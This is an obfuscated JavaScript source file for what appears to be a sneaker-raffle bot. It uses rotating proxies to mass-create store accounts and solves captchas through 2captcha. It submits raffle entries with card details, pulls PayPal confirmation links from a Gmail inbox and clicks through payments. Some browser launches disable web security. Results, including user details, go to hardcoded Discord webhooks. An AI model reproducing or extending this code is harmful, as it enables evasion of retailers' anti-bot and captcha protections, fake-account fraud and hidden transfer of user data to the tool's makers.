            console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x37b240['useRandomProxy'] = ![])
            var _0x593325 = _0x3cd98b()[_0x2988bc]['split'](':');
        else
            var _0x62295f = Math['round'](Math['random']() * (_0x3cd98b()['length'] - 0x1)), _0x593325 = _0x3cd98b()[_0x62295f]['split'](':');
        const _0x2b714b = await _0x3b2a97['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x593325[0x0] + ':' + _0x593325[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x6d4b31 = await _0x2b714b['newPage']();
            await _0x6d4b31['authenticate']({
                'username': '' + _0x593325[0x2],
                'password': '' + _0x593325[0x3]
            }), console['log'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x6d4b31['setRequestInterception'](!![]), _0x6d4b31['on']('request', _0x2017b9 => {
                _0x2017b9['resourceType']() === 'image' || _0x2017b9['resourceType']() === 'font' || _0x2017b9['resourceType']() === 'media' ? _0x2017b9['abort']() : _0x2017b9['continue']();
            }), await _0x6d4b31['goto'](_0x3172ed), await _0x28bb81(0xbb8), await _0x6d4b31['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Filling\x20information'), await _0x6d4b31['type']('#RegisterForm-FirstName', '' + bouncewear[_0x2988bc]['FirstName']), await _0x28bb81(0x226), await _0x6d4b31['type']('#RegisterForm-LastName', '' + bouncewear[_0x2988bc]['LastName']), await _0x28bb81(0x226), await _0x6d4b31['type']('#RegisterForm-email', '' + bouncewear[_0x2988bc]['Email']), await _0x28bb81(0x226), await _0x6d4b31['type']('#RegisterForm-password', '' + bouncewear[_0x2988bc]['Password']), await _0x28bb81(0x226), await _0x6d4b31['click']('#marketing'), console['log'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Submitting..'), await _0x6d4b31['$eval']('#RegisterForm', _0x2f8369 => _0x2f8369['submit']()), await _0x28bb81(0x1f40), console['log'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x6d4b31['solveRecaptchas'](), await _0x6d4b31['click']('.shopify-challenge__button.btn');
            async function _0x4e5688() {
                for (var _0x187c7e = 0x0; _0x187c7e < 0x4; _0x187c7e++) {
                    try {
                        console['log']('try'), await _0x6d4b31['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20' + _0x2367c9['red']('Catpcha\x20failed,\x20retrying..')), await _0x6d4b31['solveRecaptchas'](), await _0x6d4b31['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x4e5688(), console['log'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x28bb81(0x1f4);
            try {
                await _0x6d4b31['waitForSelector']('.featured-title'), await _0x28bb81(0x1f4), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x2988bc]['Email'] + '\x20Generated!')), _0x5e446e['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x2988bc]['Email'] + ',' + bouncewear[_0x2988bc]['Password']), console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0xa8c3fc['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x2988bc]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x3728c5) {
                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3728c5));
            }
        } catch (_0x140fa0) {
            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x2988bc + 0x1) + '\x20:\x20' + _0x140fa0));
        } finally {
            _0x2b714b && _0x2b714b['close'](), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
        }
    }
}
async function _0x58c742(_0x3ad3c2, _0x4388c4, _0x2aaaaa) {
    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x37b240['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x43af3c = 0x0; _0x43af3c < _0x4388c4['length']; _0x43af3c++) {
        _0x50109a(_0x3ad3c2['name'] + '\x20Task\x20' + (_0x43af3c + 0x1) + '\x20/\x20' + _0x4388c4['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
        var _0x136b53 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x340f37
                },
                {
                    'name': 'Product',
                    'value': '' + _0x4388c4[_0x43af3c]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4388c4[_0x43af3c]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x37b240['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37b240['version']
                }
            ]
        }];
        const _0x35a92e = { 'embeds': _0x136b53 };
        await _0x129938(_0x4388c4, _0x43af3c);
        if (_0x4388c4[_0x43af3c]['Email'] == '' || _0x4388c4[_0x43af3c]['Password'] == '' || _0x4388c4[_0x43af3c]['FirstName'] == '' || _0x4388c4[_0x43af3c]['LastName'] == '') {
            console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x4388c4[_0x43af3c]['Password'] == '' || _0x4388c4[_0x43af3c]['Password'] == undefined) && (_0x4388c4[_0x43af3c]['Password'] = 'ErehsaWonRaj1!');
        if (_0x37b240['useRandomProxy'] = ![])
            var _0xa72792 = _0x2aaaaa[_0x43af3c]['split'](':');
        else
            var _0x506a2a = Math['round'](Math['random']() * (_0x2aaaaa['length'] - 0x1)), _0xa72792 = _0x2aaaaa[_0x506a2a]['split'](':');
        const _0x44e3e9 = await _0x3b2a97['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xa72792[0x0] + ':' + _0xa72792[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x21ec86 = await _0x44e3e9['newPage']();
            await _0x21ec86['authenticate']({
                'username': '' + _0xa72792[0x2],
                'password': '' + _0xa72792[0x3]
            }), console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x21ec86['setRequestInterception'](!![]), _0x21ec86['on']('request', _0x579e32 => {
                _0x579e32['resourceType']() === 'image' || _0x579e32['resourceType']() === 'font' || _0x579e32['resourceType']() === 'media' ? _0x579e32['abort']() : _0x579e32['continue']();
            }), await _0x21ec86['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x21ec86['goto']('' + _0x4388c4[_0x43af3c]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x21ec86['waitForSelector']('#btnPdpAtb'), console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x4388c4[_0x43af3c]['Size']);
            const _0x2893fe = await _0x21ec86['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x5d6c1c => {
                return _0x5d6c1c['map'](_0x5b4766 => _0x5b4766['innerText']);
            }), _0x36a635 = await _0x21ec86['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x33149e = ![];
            if (_0x4388c4[_0x43af3c]['Size'] == 'RANDOM') {
                var _0x6f9ebf = Math['round'](Math['random']() * (_0x36a635['length'] - 0x1));
                await _0x36a635[_0x6f9ebf]['click']();
            } else
                for (var _0x30a1bf = 0x0; _0x30a1bf < _0x2893fe['length']; _0x30a1bf++) {
                    if (_0x2893fe[_0x30a1bf] != _0x4388c4[_0x43af3c]['Size'])
                        continue;
                    try {
                        await _0x36a635[_0x30a1bf]['click']();
                    } catch {
                        console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x33149e = !![];
                    }
                }
            if (_0x33149e)
                continue;
            await _0x28bb81(0x578), await _0x21ec86['click']('#btnPdpAtb'), await _0x21ec86['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x28bb81(0x3e8), console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x21ec86['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x21ec86['waitForSelector']('#email'), await _0x21ec86['type']('#email', _0x4388c4[_0x43af3c]['Email']), await _0x28bb81(0x226), await _0x21ec86['click']('#guest-submit'), await _0x28bb81(0x1b58), console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x21ec86['waitForSelector']('#firstname'), await _0x21ec86['type']('#firstname', _0x4388c4[_0x43af3c]['FirstName'], 0x1f4), await _0x28bb81(0x190), await _0x21ec86['waitForSelector']('#surname'), await _0x21ec86['type']('#surname', _0x4388c4[_0x43af3c]['LastName'], 0x1f4), await _0x28bb81(0x190), await _0x21ec86['waitForSelector']('#mobile'), await _0x21ec86['type']('#mobile', _0x4388c4[_0x43af3c]['Phone'], 0x1f4), await _0x28bb81(0x190), await _0x21ec86['click']('#enterManualDiv'), await _0x28bb81(0x5dc), await _0x21ec86['waitForSelector']('#address1'), await _0x21ec86['type']('#address1', _0x4388c4[_0x43af3c]['Address1'] + '\x20' + _0x4388c4[_0x43af3c]['HouseNumber'], 0x226), await _0x28bb81(0x384), await _0x21ec86['waitForSelector']('#address2'), await _0x21ec86['type']('#address2', '' + _0x4388c4[_0x43af3c]['Address2'], 0x226), await _0x28bb81(0x320);
            const _0x18f15b = await _0x21ec86['$$eval']('#countryselect_view3\x20>\x20option', _0x18cf92 => {
                return _0x18cf92['map'](_0x46f97a => _0x46f97a['value']);
            });
            var _0x555ff8;
            for (var _0x4f4f8c = 0x0; _0x4f4f8c < _0x18f15b['length']; _0x4f4f8c++) {
                if (_0x18f15b[_0x4f4f8c]['startsWith']('' + _0x4388c4[_0x43af3c]['Country'])) {
                    _0x555ff8 = _0x18f15b[_0x4f4f8c];
                    break;
                }
                continue;
            }
            await _0x21ec86['select']('#countryselect_view3', '' + _0x555ff8), await _0x21ec86['waitForSelector']('#address4'), await _0x21ec86['type']('#address4', '' + _0x4388c4[_0x43af3c]['City'], 0x1f4), await _0x28bb81(0x384), await _0x21ec86['waitForSelector']('#postcode'), await _0x21ec86['type']('#postcode', '' + _0x4388c4[_0x43af3c]['Zip'], 0x1f4), await _0x28bb81(0x4b0);
            const _0x1992ed = await _0x21ec86['url']();
            console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x29bdb2 = _0x1992ed['split']('?')[0x1], _0x338598 = await _0x21ec86['$']('#co_address_submit');
            await _0x338598['evaluate'](_0x113e14 => _0x113e14['click']()), await _0x28bb81(0x1388), await _0x21ec86['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x29bdb2), console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x21ec86['waitForSelector']('#paymentbuttons'), await _0x28bb81(0x1388), await _0x21ec86['click']('#paymentbuttons\x20>\x20div'), await _0x28bb81(0x1c2), await _0x21ec86['waitForSelector']('#card-number'), await _0x21ec86['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x4f98d4 = await _0x21ec86['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x543963 = await _0x4f98d4['contentFrame']();
            await _0x543963['waitForSelector']('.InputContainer'), await _0x543963['click']('.InputContainer\x20>\x20input'), await _0x28bb81(0x578), await _0x21ec86['type']('#card-number', '' + _0x4388c4[_0x43af3c]['CreditNumber']), await _0x28bb81(0xfa), await _0x21ec86['type']('#card-expiry', '' + _0x4388c4[_0x43af3c]['ExpiryDate']), await _0x28bb81(0xfa), await _0x21ec86['type']('#card-cvc', '' + _0x4388c4[_0x43af3c]['CVV']), await _0x28bb81(0x7d0), await _0x21ec86['click']('#card-button'), console['log'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x21ec86['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x40545a(_0x1efb60, _0x35a92e);
            } catch {
                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x203DS\x20Failed')), _0x136b53[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x136b53[0x0]['description'] = '3DS\x20Failed', await _0x40545a(_0x2b1b7c, _0x35a92e);
            }
        } catch (_0x26d057) {
            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x3ad3c2['name'] + ']\x20Task\x20' + (_0x43af3c + 0x1) + '\x20:\x20' + _0x26d057)), _0x136b53[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x136b53[0x0]['description'] = '' + _0x26d057, await _0x40545a(_0x2b1b7c, _0x35a92e);
        } finally {
            _0x44e3e9 && _0x44e3e9['close']();
            if (_0x43af3c + 0x1 == _0x4388c4['length']) {
                console['log'](_0x2367c9['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x28bb81(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x37b240['AfewDelay'] + '\x20ms'), await _0x28bb81(_0x37b240['AfewDelay']);
        }
    }
}
async function _0x464c99(_0x33bd9e, _0x505f60, _0x1d3d91, _0x17d55c, _0x1b231a) {
    var _0x403eff, _0x58a358 = {}, _0x723335 = [], _0x3339d4 = {}, _0x8b497a = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x17d55c && (_0x17d55c = {});
    if (_0x505f60 != 'ver') {
        _0x50109a(_0x1d3d91['name'] + '\x20Task\x20' + (_0x33bd9e + 0x1) + '\x20/\x20' + _0x17d55c['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x17d55c, _0x33bd9e), _0x723335 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x340f37
                },
                {
                    'name': 'Size',
                    'value': '' + _0x17d55c[_0x33bd9e]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x37b240['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2de2a3
                }
            ]
        }], _0x3339d4 = { 'embeds': _0x723335 }, _0x58a358 = _0x1d3d91['data'];
        _0x505f60 == 'exp' ? _0x58a358['data']['attributes']['email'] = '' + _0x17d55c[_0x33bd9e]['FirstName'] + _0x17d55c[_0x33bd9e]['LastName'] + _0x37b240['catchall'] : _0x58a358['data']['attributes']['email'] = '' + _0x17d55c[_0x33bd9e]['Email'];
        if (_0x17d55c[_0x33bd9e]['Size'] == 'RANDOM') {
        }
        _0x58a358['data']['attributes']['properties']['$first_name'] = '' + _0x17d55c[_0x33bd9e]['FirstName'], _0x58a358['data']['attributes']['properties']['$last_name'] = '' + _0x17d55c[_0x33bd9e]['LastName'], _0x58a358['data']['attributes']['properties']['$address1'] = _0x17d55c[_0x33bd9e]['Address1'] + '\x20' + _0x17d55c[_0x33bd9e]['Address2'] + '\x20' + _0x17d55c[_0x33bd9e]['HouseNumber'], _0x58a358['data']['attributes']['properties']['$zip'] = '' + _0x17d55c[_0x33bd9e]['Zip'], _0x58a358['data']['attributes']['properties']['$city'] = '' + _0x17d55c[_0x33bd9e]['City'], _0x58a358['data']['attributes']['properties']['$country'] = '' + _0x17d55c[_0x33bd9e]['Country'], _0x58a358['data']['attributes']['properties']['Size'] = '' + _0x17d55c[_0x33bd9e]['Size'], _0x58a358['data']['attributes']['properties']['$phone_number'] = '' + _0x17d55c[_0x33bd9e]['Phone'], _0x58a358['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x17d55c[_0x33bd9e]['Follower'];
    }
    if (_0x37b240['useRandomProxy'] = ![])
        var _0x5ae49c = _0x1b231a[_0x33bd9e]['split'](':');
    else
        var _0x108d95 = Math['round'](Math['random']() * (_0x1b231a['length'] - 0x1)), _0x5ae49c = _0x1b231a[_0x108d95]['split'](':');
    var _0x3752a9 = {
        'jar': _0x1945a2,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x1d3d91['url'],
        'headers': _0x1d3d91['headers'],
        'body': JSON['stringify'](_0x58a358),
        'proxy': 'http://' + _0x5ae49c[0x2] + ':' + _0x5ae49c[0x3] + '@' + _0x5ae49c[0x0] + ':' + _0x5ae49c[0x1]
    };
    return _0x505f60 != 'ver' && (_0x3752a9['url'] = _0x1d3d91['url'], _0x3752a9['headers'] = _0x1d3d91['headers']), _0x505f60 == 'ver' && (_0x3752a9['method'] = 'GET'), new Promise(function (_0x32cfe0, _0x3b3ead) {
        callback = async (_0x150c46, _0x5efaf6, _0x31d3c4) => {
            if (!_0x150c46 && _0x5efaf6['statusCode'] == 0xca || !_0x150c46 && _0x5efaf6['statusCode'] == 0xc8) {
                if (_0x505f60 != 'ver') {
                    var _0x4cec62 = await _0xb1aeae(_0x17d55c[_0x33bd9e], _0x1d3d91, 'dev', ![]), _0x49f024 = await _0xb1aeae(_0x17d55c[_0x33bd9e], _0x1d3d91, 'pub', ![]);
                    const _0x5f11e4 = {
                        'succesDEVMSG': { 'embeds': [_0x4cec62] },
                        'succesPUBMSG': { 'embeds': [_0x49f024] }
                    };
                    if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                        try {
                            await _0x40545a(_0x37b240['webhook'], _0x5f11e4['succesDEVMSG']);
                        } catch {
                        }
                    await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x5f11e4['succesDEVMSG']), await _0x28bb81(0xc8);
                    try {
                        await _0x40545a(_0x4a9ac0, _0x5f11e4['succesPUBMSG']);
                    } catch {
                    }
                    _0x4d8543(_0x17d55c[_0x33bd9e], _0x1d3d91);
                }
                _0x32cfe0(console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x1d3d91['name'] + ']\x20Task\x20' + (_0x33bd9e + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x505f60 != 'ver') {
                    var _0x1856ee = '' + _0x150c46, _0x10bbee = await _0xb1aeae(_0x17d55c[_0x33bd9e], _0x1d3d91, 'dev', !![], _0x1856ee), _0x18ee3b = {};
                    _0x18ee3b['errorDEV'] = { 'embeds': [_0x10bbee] }, _0x1322f8(_0x17d55c[_0x33bd9e], _0x1d3d91), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x18ee3b['errorDEV']), await _0x40545a(_0x2b1b7c, _0x18ee3b['errorDEV']);
                }
                _0x3b3ead(console['log'](_0x51d312() + '\x20[' + _0x1d3d91['name'] + ']\x20Task\x20' + (_0x33bd9e + 0x1) + ':\x20' + _0x150c46));
            }
        };
        try {
            _0x505f60 != 'ver' && console['log'](_0x51d312() + '\x20[' + _0x1d3d91['name'] + ']\x20Task\x20' + (_0x33bd9e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x58a358['data']['attributes']['email']), _0x1f14da(_0x3752a9, callback);
        } catch (_0x1aa60a) {
            console['log'](_0x51d312() + '\x20Task\x20' + (_0x33bd9e + 0x1) + ':\x20' + _0x1aa60a);
        }
    });
}
;
async function _0xb8020d(_0x231d1d, _0xfc7082) {
    var _0x36dd43 = [];
    async function _0x57ce79() {
        var _0x50da5d = new _0x575543({
            'user': _0x37b240['masterMail'],
            'password': _0x37b240['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x5bdb7c(_0x506f19) {
            _0x50da5d['openBox']('INBOX', ![], _0x506f19);
        }
        _0x50da5d['once']('ready', function () {
            _0x5bdb7c(function (_0xde873e, _0x1a3916) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0xde873e)
                    throw _0xde873e;
                _0x50da5d['seq']['search'](['UNSEEN'], function (_0x4d4664, _0x38425d) {
                    if (!_0x38425d || !_0x38425d['length'])
                        console['log'](_0x51d312() + '\x20[' + _0x231d1d['name'] + ']\x20No\x20mails\x20found'), _0x50da5d['end']();
                    else {
                        var _0x23cdfc = _0x50da5d['seq']['fetch'](_0x38425d, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x23cdfc['on']('message', function (_0x5062b6, _0x2305e0) {
                            var _0x5cb1e5 = '(#' + _0x2305e0 + ')\x20';
                            _0x5062b6['on']('body', function (_0x1ff519, _0x3b0ad4) {
                                _0x565ceb(_0x1ff519, (_0x33b661, _0x251e0f) => {
                                    if (_0x251e0f['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x251e0f['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x251e0f['text']['split']('[')[0x2];
                                        var _0x207062 = mes['split'](']')[0x0];
                                        _0x36dd43['push'](_0x207062);
                                    }
                                });
                            }), _0x5062b6['once']('end', function () {
                            });
                        }), _0x23cdfc['once']('error', function (_0x40df39) {
                            console['log']('Fetch\x20error:\x20' + _0x40df39);
                        }), _0x23cdfc['once']('end', function () {
                            _0x50da5d['end']();
                        });
                    }
                });
            });
        }), _0x50da5d['once']('error', function (_0x4bf44a) {
            console['log'](_0x2367c9['red'](_0x4bf44a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x50da5d['once']('end', async function () {
        }), _0x50da5d['connect']();
    }
    try {
        _0x57ce79(), await _0x28bb81(0xfa0), console['log']('Found\x20' + _0x36dd43['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x47f0fa;
    _0x50109a('' + _0x231d1d);
    var _0x323cae = _0xfc7082[0x0]['split'](':');
    const _0xadc8c4 = await _0x3b2a97['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x323cae[0x0] + ':' + _0x323cae[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Getting\x20Session');
        const _0x4deac1 = await _0xadc8c4['newPage']();
        await _0x4deac1['authenticate']({
            'username': '' + _0x323cae[0x2],
            'password': '' + _0x323cae[0x3]
        }), await _0x4deac1['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x4deac1, await _0x4deac1['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x4deac1['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Successfully\x20logged\x20in'), await _0x28bb81(0x2710);
        } catch (_0x2a7a92) {
            throw new Error('Login\x20session\x20expired\x20' + _0x2a7a92);
        }
        for (var _0x643467 = 0x0; _0x643467 < _0x36dd43['length']; _0x643467++) {
            console['log'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Task\x20' + (_0x643467 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x50109a(_0x231d1d + '\x20Task\x20' + (_0x643467 + 0x1) + '\x20/\x20' + _0x36dd43['length']);
            const _0x16de34 = await _0xadc8c4['newPage']();
            await _0x16de34['goto']('' + _0x36dd43[_0x643467], { 'waitUntil': 'networkidle2' }), await _0x28bb81(0xbb8);
            try {
                const _0x583b1c = await _0x16de34['$']('#challenge-heading');
                _0x583b1c && (console['log'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Task\x20' + (_0x643467 + 0x1) + '\x20:\x20' + _0x2367c9['yellow']('2FA\x20Required')), await _0x16de34['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x28bb81(0x61a8), await _0x16de34['waitForSelector']('#payment-submit-btn'), await _0x16de34['$eval']('#payment-submit-btn', _0x4b76b0 => _0x4b76b0['click']()), await _0x16de34['click']('#payment-submit-btn');
                try {
                    await _0x16de34['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x28bb81(0x5dc), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Task\x20' + (_0x643467 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1e4619) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x1e4619['message']);
                } finally {
                    await _0x16de34['close'](), await _0x28bb81(0x4650);
                }
            } catch (_0xd32243) {
                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x231d1d + ']\x20Task\x20' + (_0x643467 + 0x1) + '\x20:\x20' + _0xd32243));
            }
        }
    } catch (_0x16f176) {
        console['log'](_0x2367c9['red']('' + _0x16f176));
    } finally {
        await _0xadc8c4['close']();
    }
}
const _0x57cc5d = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x51a422, _0x63f64a, _0x21cb8e) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x55cf5e = 0x0; _0x55cf5e < _0x63f64a['length']; _0x55cf5e++) {
                        if (_0x4f9502 != 'yes')
                            var _0x4f9502 = '', _0x130f63 = 0x0;
                        var _0x5bf6c4;
                        await _0x129938(_0x63f64a, _0x55cf5e), _0x50109a(_0x51a422['name'] + '\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20/\x20' + _0x63f64a['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
                        var _0x32d563 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x4b856d = Math['round'](Math['random']() * (_0x32d563['length'] - 0x1));
                        _0x63f64a[_0x55cf5e]['Size'] == 'RANDOM' && (_0x63f64a[_0x55cf5e]['Size'] = _0x32d563[_0x4b856d]);
                        var _0x521afe = Math['round'](Math['random']() * (_0x21cb8e['length'] - 0x1)), _0x3077db = _0x21cb8e[_0x521afe]['split'](':'), _0x1940ad;
                        try {
                            _0x1940ad = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3077db[0x0] + ':' + _0x3077db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1940ad = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3077db[0x0] + ':' + _0x3077db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Getting\x20Session');
